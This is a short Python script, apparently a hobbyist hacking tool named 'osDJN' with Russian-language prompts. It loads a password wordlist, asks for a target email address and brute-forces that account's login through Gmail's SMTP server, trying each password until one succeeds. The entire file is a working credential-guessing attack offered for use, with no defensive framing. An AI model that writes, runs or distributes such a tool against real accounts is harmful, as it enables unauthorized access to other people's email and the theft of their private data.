import smtplib
import colorama
from colorama import init, Fore, Back
from os import system
print('      ======================  ')
print('       ****** osDJN ******                       ')
print('      ======================  ')
init()
print ('1. Start')
print ('2. Exit')
option = input('> ')
if option == '1':
   passlist = input('Название файла с паролями >>  ')
if option == '2':
   exit()
pass_found = open(passlist, 'r')
user_name = input('Почта к каторой надо подобрать пароль >>  ')
server = smtplib.SMTP('smtp.googlemail.com',587)
server.ehlo()
server.starttls()
for password in pass_found:
    try:
        server.login(user_name, password)
        print(Fore.GREEN + '[+] Password Found: ' + password)
        break;
    except smtplib.SMTPAuthenticationError:
       print(Fore.RED + '[-] Password not founded')
input()